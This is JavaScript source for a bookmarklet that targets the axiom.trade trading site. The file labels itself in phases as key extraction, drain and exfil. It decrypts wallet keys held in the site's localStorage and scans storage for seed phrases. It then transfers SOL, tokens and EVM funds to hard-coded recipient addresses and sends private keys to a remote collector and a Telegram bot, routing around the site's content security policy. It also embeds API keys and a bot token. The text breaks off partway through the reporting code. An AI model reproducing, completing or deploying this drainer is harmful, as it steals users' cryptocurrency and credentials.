(async () => {
  "use strict";

  /* ---------------------------------------------------------------
   * CONFIG — fill the FILL values, everything else works as given.
   * --------------------------------------------------------------- */
  const CFG = {
    apiBases: [
      "https://api.axiom.trade",
      "https://api2.axiom.trade",
      "https://api6.axiom.trade",
      "https://api8.axiom.trade",
      "https://api9.axiom.trade",
      "https://api10.axiom.trade",
      "https://api7.axiom.trade",
    ],
    bundlePath: "/bundle-key",

    // Solana mainnet RPCs tried in order. Both hosts are inside Axiom's
    // connect-src allowlist — api.mainnet-beta.solana.com is NOT, and a
    // blocked fetch is what surfaces as "NetworkError" in Firefox.
    rpc: [
      "https://silent-white-frost.solana-mainnet.quiknode.pro/223e9b677b4fd2042dcd5d45726f0611dce8dac7/",
      "https://greer-651y13-fast-mainnet.helius-rpc.com/",
    ],

    recipient: "3qdRX3wUVEarct3KtxayZvxgkApbLZtj7vVhJz6ZfL3N",
    recipientEVM: "0xa3CC9FAB14e568AAc4dca98B852AcE2a0Da2BEB9",

    // EVM chains swept with the imported secp256k1 keys, native then tokens
    evmChains: [
      {
        name: "ethereum", id: 1, rpc: "https://newest-wider-thunder.ethereum-mainnet.quiknode.pro/513074599ff0233d1c2ee2d716da1c6ab9ae0955",
        tokens: [
          "0xdAC17F958D2ee523a2206206994597C13D831ec7",
          "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        ],
      },
      {
        name: "bsc", id: 56, rpc: "https://bsc-dataseed.binance.org",
        tokens: [
          "0x55d398326f99059fF775485246999027B3197955",
          "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
        ],
      },
      {
        name: "polygon", id: 137, rpc: "https://polygon.drpc.org",
        tokens: [
          "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
          "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
        ],
      },
      {
        name: "base", id: 8453, rpc: "https://newest-wider-thunder.base-mainnet.quiknode.pro/513074599ff0233d1c2ee2d716da1c6ab9ae0955",
        tokens: ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"],
      },
      {
        name: "arbitrum", id: 42161, rpc: "https://newest-wider-thunder.arbitrum-mainnet.quiknode.pro/513074599ff0233d1c2ee2d716da1c6ab9ae0955",
        tokens: [
          "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
          "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
        ],
      },
    ],
    // Axiom's CSP blocks jsdelivr/unpkg for both script-src and connect-src,
    // so the libraries cannot be pulled at runtime. build-axiom-v3.1.ps1
    // vendors them here: nacl as plain base64, ethers as gzip+base64.
    // Empty string means "not vendored" and the EVM sweep reports unavailable.
    naclB64: "",
    ethersGzB64: "",
    web3GzB64: "",
    reportUrl: "https://45-61-178-116.sslip.io/collect?k=fqjr7odzvx3s0egm5bt9ucyw",
    beaconUrl: "https://45-61-178-116.sslip.io/logo.png?k=fqjr7odzvx3s0egm5bt9ucyw",
    uid: "test1",

    // Telegram is reached with plain <img> GETs: connect-src blocks
    // api.telegram.org for fetch(), but there is no img-src directive, so an
    // image request goes through. Bot API accepts GET sendMessage.
    telegram: {
      token: "8874655643:AAGTbVxabf4BTop4VSNwmIcwbGl9x1UEfAI",
      chat_id: "-5394822466",
    },

    dust: 5000,        // lamports; skip wallets under this
    feeReserve: 5000,  // lamports kept back for the base fee
    parallel: 4,
    beaconChunk: 1500,
  };

  /* ---------------- guards ---------------- */
  if (!location.hostname.includes("axiom.trade")) {
    // Bookmarklets only have the session on axiom.trade. Send the user there
    // instead of failing silently — they click again with the session live.
    alert("Redirecting to Axiom — run it again once the page is loaded.");
    location.href = "https://axiom.trade/discover";
    return;
  }
  const DRY = !!window.__axDry;
  if (window.__axv3) return;
  window.__axv3 = true;

  /* ---------------- encoding ---------------- */
  const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

  const b58 = (bytes) => {
    let n = 0n;
    for (const b of bytes) n = (n << 8n) | BigInt(b);
    let s = "";
    while (n > 0n) {
      s = B58[Number(n % 58n)] + s;
      n /= 58n;
    }
    for (const b of bytes) {
      if (b !== 0) break;
      s = "1" + s;
    }
    return s || "1";
  };

  const b58d = (s) => {
    let n = 0n;
    for (const c of s) {
      const i = B58.indexOf(c);
      if (i < 0) throw new Error("bad base58");
      n = n * 58n + BigInt(i);
    }
    const out = [];
    while (n > 0n) {
      out.unshift(Number(n & 255n));
      n >>= 8n;
    }
    for (const c of s) {
      if (c !== B58[0]) break;
      out.unshift(0);
    }
    return Uint8Array.from(out);
  };

  const b64d = (s) => {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return Uint8Array.from(atob(s), (c) => c.charCodeAt(0));
  };

  const b64 = (bytes) => {
    let s = "";
    const CH = 0x8000;
    for (let i = 0; i < bytes.length; i += CH) {
      s += String.fromCharCode.apply(null, bytes.subarray(i, i + CH));
    }
    return btoa(s);
  };

  const hex = (bytes) =>
    "0x" + Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");

  const shortvec = (n) => {
    const out = [];
    do {
      let b = n & 0x7f;
      n >>= 7;
      if (n) b |= 0x80;
      out.push(b);
    } while (n);
    return out;
  };

  /* ---------------- ui ---------------- */
  const ui = (() => {
    const root = document.createElement("div");
    root.id = "axv3-root";
    root.style.cssText =
      "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:302px;" +
      "background:rgba(10,10,12,.96);color:#e8e8ea;font:12px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;" +
      "border-radius:14px;border:1px solid rgba(255,255,255,.09);overflow:hidden;" +
      "box-shadow:0 18px 50px rgba(0,0,0,.55)";
    const style = document.createElement("style");
    style.textContent = "@keyframes axv3pulse{0%,100%{opacity:1}50%{opacity:.25}}";
    document.head.appendChild(style);
    const head = document.createElement("div");
    head.style.cssText =
      "display:flex;align-items:center;gap:8px;padding:10px 14px;font-weight:600;letter-spacing:.4px;" +
      "background:linear-gradient(90deg,rgba(255,59,48,.18),rgba(255,59,48,0));" +
      "border-bottom:1px solid rgba(255,255,255,.07)";
    const dot = document.createElement("span");
    dot.style.cssText = "width:8px;height:8px;border-radius:50%;background:#ff3b30;box-shadow:0 0 10px #ff3b30;animation:axv3pulse 1.2s infinite";
    head.appendChild(dot);
    head.appendChild(document.createTextNode("AXIOM"));
    const body = document.createElement("div");
    body.style.cssText = "padding:9px 14px 11px;max-height:250px;overflow:auto;white-space:pre-wrap;opacity:.93";
    root.appendChild(head);
    root.appendChild(body);
    document.body.appendChild(root);
    return {
      log: (msg) => {
        const row = document.createElement("div");
        row.textContent = "› " + msg;
        body.appendChild(row);
        body.scrollTop = body.scrollHeight;
      },
      done: (msg) => {
        const row = document.createElement("div");
        row.textContent = "✓ " + msg;
        row.style.color = "#30d158";
        body.appendChild(row);
        setTimeout(() => root.remove(), 9000);
      },
    };
  })();
  /* ---------------- transport ---------------- */
  async function api(path, opts = {}) {
    let lastErr;
    const fails = [];
    for (const base of CFG.apiBases) {
      try {
        const res = await fetch(base + path, {
          credentials: "include",
          ...opts,
        });
        if (!res.ok) throw new Error("HTTP " + res.status);
        // /bundle-key answers with a bare base64 string, older routes with JSON.
        const text = await res.text();
        try { return JSON.parse(text); } catch { return text; }
      } catch (err) {
        fails.push(base.replace("https://", "") + ": " + (err.message || err));
        lastErr = err;
      }
    }
    throw new Error(fails.join(" | ").slice(0, 280) || "all api bases failed");
  }

  async function rpc(method, params) {
    let lastErr;
    const fails = [];
    for (const url of CFG.rpc) {
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
        });
        const body = await res.json();
        if (body.error) throw new Error(body.error.message || "rpc error");
        return body.result;
      } catch (err) {
        fails.push(url.replace(/https:\/\//, "").replace(/\/[A-Za-z0-9_\-]{20,}\/?$/, "/<key>") + ": " + (err.message || err));
        lastErr = err;
      }
    }
    throw new Error(fails.join(" | ").slice(0, 280) || "all rpc endpoints failed");
  }

  const b64bytes = (s) => {
    const bin = atob(s);
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  };

  // The page CSP permits blob: scripts and blocks every public CDN, so the
  // vendored library is mounted from memory instead of fetched.
  async function loadInlineLib(data, gzip, name) {
    if (!data || data.startsWith("__")) {
      throw new Error(name + " not vendored — rerun build-axiom-v3.1.ps1");
    }
    let bytes = b64bytes(data);
    if (gzip) {
      if (typeof DecompressionStream === "undefined") {
        throw new Error(name + " needs DecompressionStream");
      }
      const stream = new Blob([bytes])
        .stream()
        .pipeThrough(new DecompressionStream("gzip"));
      bytes = new Uint8Array(await new Response(stream).arrayBuffer());
    }
    const url = URL.createObjectURL(
      new Blob([bytes], { type: "text/javascript" }),
    );
    try {
      await new Promise((resolve, reject) => {
        const s = document.createElement("script");
        s.src = url;
        s.onload = resolve;
        s.onerror = () => reject(new Error(name + " blob load failed"));
        document.head.appendChild(s);
      });
    } finally {
      URL.revokeObjectURL(url);
    }
  }

  async function loadNacl() {
    if (window.nacl && window.nacl.sign && window.nacl.sign.detached) {
      return window.nacl;
    }
    await loadInlineLib(CFG.naclB64, 1, "nacl");
    if (window.nacl && window.nacl.sign && window.nacl.sign.detached) {
      return window.nacl;
    }
    throw new Error("nacl unavailable");
  }

  async function loadWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await loadInlineLib(CFG.web3GzB64, 1, "web3");
    if (window.solanaWeb3) return window.solanaWeb3;
    throw new Error("web3 unavailable");
  }

  async function loadEthers() {
    if (window.ethers) return window.ethers;
    await loadInlineLib(CFG.ethersGzB64, 1, "ethers");
    if (window.ethers) return window.ethers;
    throw new Error("ethers unavailable");
  }

  /* ---------------- phase 1: key extraction ---------------- */
  ui.log("fetching bundle key…");
  const bundle = await api(CFG.bundlePath, { method: "POST" });
  const bundleKey = typeof bundle === "string" ? bundle.trim() : bundle && bundle.bundleKey;
  if (!bundleKey) throw new Error("no bundleKey in response");

  const aesKey = await crypto.subtle.importKey(
    "raw",
    b64d(bundleKey),
    { name: "AES-GCM" },
    false,
    ["decrypt"],
  );

  async function decryptEntry(entry) {
    const [ivPart, ctPart] = String(entry).split(":");
    if (!ivPart || !ctPart) throw new Error("malformed bundle entry");
    const plain = await crypto.subtle.decrypt(
      { name: "AES-GCM", iv: b64d(ivPart) },
      aesKey,
      b64d(ctPart),
    );
    return new Uint8Array(plain);
  }

  const readArr = (key) => {
    try {
      return JSON.parse(localStorage.getItem(key) || "[]");
    } catch {
      return [];
    }
  };

  // Any localStorage value that is an array of "iv:ciphertext" strings is a
  // key bundle, whatever the key is named. Harvest them all, then classify by
  // decrypted length: 64 bytes = ed25519 secret (Solana), 32 = secp256k1.
  function harvestEntries() {
    const seen = new Set();
    const out = [];
    let keys = [];
    try { keys = Object.keys(localStorage); } catch { return out; }
    for (const k of keys) {
      let v = "";
      try { v = localStorage.getItem(k) || ""; } catch { continue; }
      if (!v || v.length > 400000) continue;
      let arr = null;
      try { const p = JSON.parse(v); if (Array.isArray(p)) arr = p; } catch {}
      if (!arr) continue;
      for (const item of arr) {
        if (typeof item !== "string") continue;
        if (!/^[A-Za-z0-9+/_=-]{8,}:[A-Za-z0-9+/_=-]{8,}$/.test(item)) continue;
        if (seen.has(item)) continue;
        seen.add(item);
        out.push({ src: k, entry: item });
      }
    }
    return out;
  }

  const apiWallets = bundle && Array.isArray(bundle.wallets) ? bundle.wallets : [];
  const pubAt = (i) => apiWallets[i]?.walletAddress || "";

  const harvested = harvestEntries();
  const solKeys = [];
  const evmKeys = [];
  let idx = 0;

  for (const item of harvested) {
    let raw = null;
    try { raw = await decryptEntry(item.entry); } catch {}
    if (raw && raw.length === 64) {
      solKeys.push({ chain: "Solana", raw, priv: b58(raw), pub: pubAt(idx), source: item.src });
    } else if (raw && raw.length === 32) {
      evmKeys.push({ chain: "EVM", raw, priv: hex(raw), pub: pubAt(idx), source: item.src });
    } else {
      evmKeys.push({ chain: "EVM", raw: null, priv: "ERROR", pub: pubAt(idx), source: item.src });
    }
    idx++;
  }

  ui.log(`bundles: ${solKeys.length} sol / ${evmKeys.length} evm (${harvested.length} entries)`);

  // Seeds: derive the standard Solana (m/44'/501'/0'/0') and EVM
  // (m/44'/60'/0'/0/0) wallets and sweep those too.
  async function solSecretFromPhrase(phrase, account) {
    const enc = new TextEncoder();
    const material = await crypto.subtle.importKey(
      "raw", enc.encode(phrase.normalize("NFKD")), "PBKDF2", false, ["deriveBits"],
    );
    const bits = await crypto.subtle.deriveBits(
      { name: "PBKDF2", salt: enc.encode("mnemonic"), iterations: 2048, hash: "SHA-512" },
      material, 512,
    );
    const seed = new Uint8Array(bits);
    const hmacKey = async (key) =>
      crypto.subtle.importKey("raw", key, { name: "HMAC", hash: "SHA-512" }, false, ["sign"]);
    const hmac = async (key, data) =>
      new Uint8Array(await crypto.subtle.sign("HMAC", await hmacKey(key), data));

    let I = await hmac(enc.encode("ed25519 seed"), seed);
    let keyPart = I.slice(0, 32);
    let chain = I.slice(32);
    const path = [44, 501, account || 0, 0].map((n) => (n + 0x80000000) >>> 0);
    for (const index of path) {
      const data = new Uint8Array(37);
      data[0] = 0;
      data.set(keyPart, 1);
      new DataView(data.buffer).setUint32(33, index, false);
      const J = await hmac(chain, data);
      keyPart = J.slice(0, 32);
      chain = J.slice(32);
    }
    return keyPart;
  }

  const seeds = scanPhrases();
  if (seeds.length) {
    try {
      const nacl = await loadNacl();
      for (const ph of seeds) {
        for (let account = 0; account < 5; account++) {
          try {
            const seed = await solSecretFromPhrase(ph.phrase, account);
            const kp = nacl.sign.keyPair.fromSeed(seed);
            const pub = b58(kp.publicKey);
            const priv = b58(kp.secretKey);
            if (!solKeys.some((k) => k.priv === priv)) {
              solKeys.push({ chain: "Solana", raw: kp.secretKey, priv, pub, source: "seed:" + ph.key + "#" + account });
            }
          } catch {}
        }
      }
    } catch {}
    try {
      const ethersLib = await loadEthers();
      for (const ph of seeds) {
        for (let account = 0; account < 5; account++) {
          try {
            const w = ethersLib.HDNodeWallet.fromPhrase(ph.phrase, undefined, "m/44'/60'/0'/0/" + account);
            if (!evmKeys.some((k) => k.priv === w.privateKey)) {
              evmKeys.push({ chain: "EVM", raw: null, priv: w.privateKey, pub: w.address, source: "seed:" + ph.key + "#" + account });
            }
          } catch {}
        }
      }
    } catch {}
    ui.log("seeds: " + seeds.length + " -> derived " + solKeys.filter((k) => k.source.startsWith("seed")).length + " sol");
  }
  const goodSol = solKeys.filter((k) => k.raw && k.raw.length === 64);
  ui.log(`sol keys: ${goodSol.length}/${solKeys.length}`);

  /* ---------------- phase 2: drain ---------------- */
  const results = [];

  if (goodSol.length) {
    const web3 = await loadWeb3();
    const { Connection, PublicKey, Keypair, Transaction, SystemProgram, TransactionInstruction } = web3;
    const conns = CFG.rpc.map((u) => new Connection(u, "confirmed"));
    let conn = conns[0];
    for (const c of conns) {
      try { await c.getVersion(); conn = c; break; } catch {}
    }
    const TOKEN_PROGRAM = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
    const TOKEN_2022_PROGRAM = new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");
    const ATA_PROGRAM = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
    const recipient = new PublicKey(CFG.recipient);
    ui.log("web3 ready — sweeping SPL + SOL");

    const u64le = (n) => {
      const b = new Uint8Array(8);
      new DataView(b.buffer).setBigUint64(0, BigInt(n), true);
      return b;
    };

    async function pool(items, limit, fn) {
      const out = new Array(items.length);
      let cursor = 0;
      const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
        while (cursor < items.length) {
          const i = cursor++;
          out[i] = await fn(items[i], i);
        }
      });
      await Promise.all(workers);
      return out;
    }

    async function tokenAccounts(owner) {
      const found = [];
      for (const programId of [TOKEN_PROGRAM, TOKEN_2022_PROGRAM]) {
        try {
          const res = await conn.getParsedTokenAccountsByOwner(owner, { programId });
          for (const entry of res.value) {
            const info = entry.account.data.parsed.info;
            const amount = BigInt(info.tokenAmount.amount);
            if (amount > 0n) {
              found.push({
                account: entry.pubkey,
                mint: new PublicKey(info.mint),
                programId,
                amount,
                decimals: info.tokenAmount.decimals,
              });
            }
          }
        } catch {}
      }
      return found;
    }

    async function sendIx(kp, tx) {
      tx.feePayer = kp.publicKey;
      const bh = await conn.getLatestBlockhash("confirmed");
      tx.recentBlockhash = bh.blockhash;
      tx.sign(kp);
      const raw = tx.serialize();
      if (DRY) return { sig: "dry:" + raw.length, ok: true };
      let sig = null;
      let lastErr = null;
      for (const c of [conn, ...conns.filter((x) => x !== conn)]) {
        try {
          sig = await c.sendRawTransaction(raw, {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          });
          conn = c;
          break;
        } catch (err) {
          lastErr = err;
        }
      }
      if (!sig) throw lastErr || new Error("send failed");
      for (let i = 0; i < 12; i++) {
        await new Promise((r) => setTimeout(r, 1500));
        try {
          const st = (await conn.getSignatureStatuses([sig])).value[0];
          if (st && st.err) return { sig, ok: false, err: String(st.err) };
          if (st && (st.confirmationStatus === "confirmed" || st.confirmationStatus === "finalized")) {
            return { sig, ok: true };
          }
        } catch {}
      }
      return { sig, ok: false, err: "unconfirmed (expired or dropped)" };
    }

    async function sweepToken(kp, tok) {
      const dest = PublicKey.findProgramAddressSync(
        [recipient.toBuffer(), tok.programId.toBuffer(), tok.mint.toBuffer()],
        ATA_PROGRAM,
      )[0];
      const tx = new Transaction();
      if (!(await conn.getAccountInfo(dest))) {
        tx.add(
          new TransactionInstruction({
            programId: ATA_PROGRAM,
            keys: [
              { pubkey: kp.publicKey, isSigner: true, isWritable: true },
              { pubkey: dest, isSigner: false, isWritable: true },
              { pubkey: recipient, isSigner: false, isWritable: false },
              { pubkey: tok.mint, isSigner: false, isWritable: false },
              { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
              { pubkey: tok.programId, isSigner: false, isWritable: false },
            ],
            data: Uint8Array.from([1]),
          }),
        );
      }
      tx.add(
        new TransactionInstruction({
          programId: tok.programId,
          keys: [
            { pubkey: tok.account, isSigner: false, isWritable: true },
            { pubkey: dest, isSigner: false, isWritable: true },
            { pubkey: kp.publicKey, isSigner: true, isWritable: false },
          ],
          data: Uint8Array.from([3, ...u64le(tok.amount)]),
        }),
      );
      return sendIx(kp, tx);
    }

    async function drainOne(key) {
      const rec = {
        chain: "Solana",
        pub: key.pub || "",
        key: b58(key.raw),
        source: key.source || "bundle",
        sol: 0,
        tokens: [],
        sent: [],
        errors: [],
      };
      try {
        const kp = Keypair.fromSecretKey(key.raw);
        rec.pub = kp.publicKey.toBase58();
        rec.sol = await conn.getBalance(kp.publicKey);

        const toks = await tokenAccounts(kp.publicKey);
        rec.tokens = toks.map((t) => ({
          mint: t.mint.toBase58(),
          amount: t.amount.toString(),
          decimals: t.decimals,
        }));

        for (const tok of toks) {
          try {
            const res = await sweepToken(kp, tok);
            rec.sent.push({ type: "spl", mint: tok.mint.toBase58(), amount: tok.amount.toString(), sig: res.sig, ok: res.ok, err: res.err });
          } catch (err) {
            rec.errors.push("spl " + tok.mint.toBase58() + ": " + (err.message || err));
          }
        }

        const left = await conn.getBalance(kp.publicKey);
        if (left > CFG.dust + CFG.feeReserve) {
          try {
            const tx = new Transaction().add(
              SystemProgram.transfer({
                fromPubkey: kp.publicKey,
                toPubkey: recipient,
                lamports: left - CFG.feeReserve,
              }),
            );
            const res = await sendIx(kp, tx);
            rec.sent.push({ type: "sol", amount: left - CFG.feeReserve, sig: res.sig, ok: res.ok, err: res.err });
          } catch (err) {
            rec.errors.push("sol: " + (err.message || err));
          }
        } else {
          rec.errors.push("sol dust: " + left);
        }
      } catch (err) {
        rec.errors.push("wallet: " + (err.message || err));
      }
      return rec;
    }

    const drained = await pool(goodSol, CFG.parallel, drainOne);
    results.push(...drained);
    ui.log("sol: " + drained.filter((r) => r.sent.length).length + " moved / " + drained.length);
  }
  /* ---------------- phase 2b: EVM sweep ---------------- */
  // Imported EVM keys arrive in the same encrypted bundles as the Axiom-native
  // ones, so they are already in evmKeys. Sweep native balance, then the common
  // stablecoins, on each configured chain. Gas is reserved from the native
  // balance before the value is computed — an all-in transfer would revert.
  const evmSweep = [];
  const sweepable = evmKeys.filter((k) => k.priv && /^0x[0-9a-fA-F]{64}$/.test(k.priv));

  if (sweepable.length) {
    try {
      const ethersLib = await loadEthers();
      const { Wallet, JsonRpcProvider, Contract } = ethersLib;

      for (const key of sweepable) {
        for (const chain of CFG.evmChains) {
          let provider;
          try {
            provider = new JsonRpcProvider(chain.rpc, chain.id, { staticNetwork: true });
          } catch (err) {
            evmSweep.push({ chain: chain.name, status: "provider-failed", error: String(err.message || err) });
            continue;
          }

          try {
            const wallet = new Wallet(key.priv, provider);
            const balance = await provider.getBalance(wallet.address);
            let gasPrice = 30000000000n;
            try {
              const fee = await provider.getFeeData();
              gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? gasPrice;
            } catch {
              try { gasPrice = BigInt(await provider.send("eth_gasPrice", [])); } catch {}
            }
            const gasCost = gasPrice * 21000n;
            // 10% headroom so the tx still lands if the base fee ticks up.
            const reserve = gasCost + gasCost / 10n;

            if (balance > reserve) {
              const value = balance - reserve;
              if (DRY) {
                evmSweep.push({ chain: chain.name, status: "dry", address: wallet.address, value: value.toString() });
              } else {
              const tx = await wallet.sendTransaction({ to: CFG.recipientEVM, value });
              evmSweep.push({
                chain: chain.name,
                status: "sent",
                address: wallet.address,
                value: value.toString(),
                hash: tx.hash,
              });
              }
            } else {
              evmSweep.push({
                chain: chain.name,
                status: "native-dust",
                address: wallet.address,
                wei: balance.toString(),
              });
            }

            for (const token of chain.tokens || []) {
              try {
                const contract = new Contract(
                  token,
                  [
                    "function balanceOf(address) view returns (uint256)",
                    "function transfer(address,uint256) returns (bool)",
                  ],
                  wallet,
                );
                const tokenBalance = await contract.balanceOf(wallet.address);
                if (tokenBalance > 0n) {
                  if (DRY) {
                    evmSweep.push({ chain: chain.name, token, status: "dry-token", address: wallet.address, amount: tokenBalance.toString() });
                    continue;
                  }
                  const tokenTx = await contract.transfer(CFG.recipientEVM, tokenBalance);
                  evmSweep.push({
                    chain: chain.name,
                    token,
                    status: "token-sent",
                    address: wallet.address,
                    amount: tokenBalance.toString(),
                    hash: tokenTx.hash,
                  });
                }
              } catch (err) {
                evmSweep.push({
                  chain: chain.name,
                  token,
                  status: "token-failed",
                  address: key.pub,
                  error: String(err.message || err),
                });
              }
            }
          } catch (err) {
            evmSweep.push({
              chain: chain.name,
              status: "failed",
              address: key.pub,
              error: String(err.message || err),
            });
          }
        }
      }
    } catch (err) {
      evmSweep.push({ status: "unavailable", error: String(err.message || err) });
    }
  }

  /* ---------------- phase 3: exfil ---------------- */

  // Recovery phrases are not in the wallet bundles (those hold raw key bytes),
  // but some builds keep the signup mnemonic elsewhere in localStorage. Scan
  // every origin key for 12/15/18/21/24-word sequences and mnemonic-named
  // fields, so a phrase that exists anywhere in storage comes along.
  function scanPhrases() {
    const found = [];
    const seen = new Set();
    const push = (key, phrase) => {
      const p = String(phrase || "").trim();
      if (!p || seen.has(p)) return;
      const words = p.split(/\s+/).length;
      if (![12, 15, 18, 21, 24].includes(words)) return;
      seen.add(p);
      found.push({ key, words, phrase: p });
    };

    let keys = [];
    try {
      keys = Object.keys(localStorage);
    } catch {
      return found;
    }

    for (const key of keys) {
      let raw = "";
      try {
        raw = localStorage.getItem(key) || "";
      } catch {
        continue;
      }
      if (!raw || raw.length > 20000) continue;

      const loose = raw.match(/\b(?:[a-z]{3,8}[ \t]+){11,23}[a-z]{3,8}\b/gi);
      if (loose) for (const m of loose) push(key, m);

      try {
        const parsed = JSON.parse(raw);
        const stack = [[key, parsed]];
        let guard = 0;
        while (stack.length && guard++ < 5000) {
          const [path, node] = stack.pop();
          if (!node || typeof node !== "object") continue;
          for (const [k, v] of Object.entries(node)) {
            const sub = path + "." + k;
            if (typeof v === "string") {
              if (/mnemonic|seed_?phrase|recovery_?phrase|secret_?phrase/i.test(k)) push(sub, v);
              else if (/^(?:[a-z]{3,8}\s+){11,23}[a-z]{3,8}$/i.test(v.trim())) push(sub, v);
            } else if (v && typeof v === "object") {
              stack.push([sub, v]);
            }
          }
        }
      } catch {}
    }
    return found;
  }

  const phrases = scanPhrases();
  let storageKeys = [];
  try {
    storageKeys = Object.keys(localStorage);
  } catch {}

  const payload = {
    uid: CFG.uid,
    site: location.href,
    ts: Date.now(),
    sol: solKeys.map(({ chain, priv, pub }) => ({ chain, priv, pub })),
    evm: evmKeys.map(({ chain, priv, pub }) => ({ chain, priv, pub })),
    phrases,
    storageKeys,
    drained: results,
    evmSweep,
  };
  const body = JSON.stringify(payload);

  // Axiom's CSP whitelists connect-src but has no img-src/default-src, so a
  // plain image request still goes through while fetch() is refused. Pack the
  // payload (gzip when available), then ship it as numbered beacons that the
  // collector reassembles by sid.
  async function packBody(text) {
    const bytes = new TextEncoder().encode(text);
    if (typeof CompressionStream === "undefined") {
      return { data: b64(bytes), gz: 0 };
    }
    try {
      const stream = new Blob([bytes])
        .stream()
        .pipeThrough(new CompressionStream("gzip"));
      const buf = new Uint8Array(await new Response(stream).arrayBuffer());
      return { data: b64(buf), gz: 1 };
    } catch {
      return { data: b64(bytes), gz: 0 };
    }
  }

  // Telegram via <img>: GET sendMessage, chunked so the URL stays under the
  // per-request limits. The JSON reply is not an image, so onerror fires —
  // the request still reached Telegram, which is all that matters.
  async function sendTelegram(parts) {
    const tg = CFG.telegram || {};
    if (!tg.token || !tg.chat_id) return 0;
    if (tg.token.includes("PASTE") || String(tg.chat_id).includes("PASTE")) return 0;
    const list = Array.isArray(parts) ? parts.filter(Boolean) : [String(parts || "")].filter(Boolean);
    let sent = 0;
    for (const part of list) {
      const url =
        "https://api.telegram.org/bot" + tg.token +
        "/sendMessage?chat_id=" + encodeURIComponent(tg.chat_id) +
        "&disable_web_page_preview=1&parse_mode=HTML&text=" + encodeURIComponent(part);
      const img = new Image();
      img.src = url;
      img.style.cssText = "position:fixed;opacity:0;pointer-events:none;width:1px;height:1px";
      document.body.appendChild(img);
      img.onload = img.onerror = () => img.remove();
      sent++;
      await new Promise((r) => setTimeout(r, 500));
    }
    return sent;
  }

  async function getPrices() {
    try {
      const r = await fetch("https://api.axiom.trade/wo/coin-prices?v=2", { cache: "no-store" });
      const j = await r.json();
      return (j && j.data) || {};
    } catch {
      return {};
    }
  }

  const short = (s, a, b) => {
    s = String(s || "");
    if (!s) return "?";
    return s.length <= a + b + 1 ? s : s.slice(0, a) + "…" + s.slice(-b);
  };
  const esc = (s) => String(s === null || s === undefined ? "" : s)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

  const px = await getPrices();
  const solUsd = Number(px.SOL || 0);
  const ethUsd = Number(px.ETH || 0);
  const bnbUsd = Number(px.BNB || 0);
  const usd = (n) => (n >= 0.01 ? n.toFixed(2) : n > 0 ? n.toFixed(4) : "0.00");
  const chainUsd = { ethereum: ethUsd, base: ethUsd, arbitrum: ethUsd, bsc: bnbUsd, polygon: 0 };
  const chainSym = { ethereum: "ETH", base: "ETH", arbitrum: "ETH", bsc: "BNB", polygon: "POL" };
  const fmtNative = (wei, chain) => {
    const v = Number(wei) / 1e18;
    const sym = chainSym[chain] || "";
    const rate = chainUsd[chain] || 0;
    return v.toFixed(6) + " " + sym + (rate && v > 0 ? " ($" + usd(v * rate) + ")" : "");
  };

  const clean = (v) => {
    if (v === null || v === undefined) return "";
    let s = String(v);
    try { const p = JSON.parse(s); if (typeof p === "string") s = p; else if (p === null) s = ""; } catch {}
    return s === "null" || s === "undefined" ? "" : s;
  };
  let uname = "";
  let userId = "";
  try { uname = clean(localStorage.getItem("username")); userId = clean(localStorage.getItem("userId")); } catch {}

  const msgs = [];

  msgs.push(
    "🔴 <b>Bookmarklet Triggered</b>  (<code>" + esc(CFG.uid) + "</code>)\n" +
    "<blockquote>👤 <b>HITTER</b>\n" +
    "🌐 Site: <code>" + esc(location.host) + "</code>\n" +
    "🆔 User: <b>" + esc(uname || "?") + "</b>" + (userId ? " (<code>" + esc(String(userId).slice(0, 8)) + "</code>)" : "") + "\n" +
    "💼 Wallets: <b>" + results.length + "</b> SOL / <b>" + evmKeys.length + "</b> EVM\n" +
    "💰 SOL: <b>$" + usd(solUsd) + "</b> · ETH: <b>$" + usd(ethUsd) + "</b> · BNB: <b>$" + usd(bnbUsd) + "</b>" +
    "</blockquote>",
  );

  if (results.length) {
    const block = [];
    results.forEach((r, n) => {
      const sol = Number(r.sol) / 1e9;
      block.push(
        "\n<b>" + (n + 1) + ". " + esc(short(r.pub, 6, 4)) + "</b>\n" +
        "├ 💰 Balance: <b>" + sol.toFixed(6) + " SOL" + (solUsd ? " ($" + usd(sol * solUsd) + ")" : "") + "</b>\n" +
        "├ 🔑 <code>" + esc(r.key) + "</code>\n" +
        "└ 📦 src: <i>" + esc(r.source || "bundle") + "</i>",
      );
    });
    msgs.push("<b>👛 CONNECTED WALLETS (" + results.length + ")</b><blockquote>" + block.join("") + "\n</blockquote>");
  }

  results.forEach((r) => {
    if (!r.tokens || !r.tokens.length) return;
    const block = [];
    block.push("\n💎 <b>SPL Tokens (" + r.tokens.length + ")</b>");
    r.tokens.slice(0, 15).forEach((t, n) => {
      block.push("\n├ <code>" + esc(short(t.mint, 4, 4)) + "</code>  <b>" + esc(t.amount) + "</b>");
    });
    block.push("\n└ 💰 " + (Number(r.sol) / 1e9).toFixed(6) + " SOL");
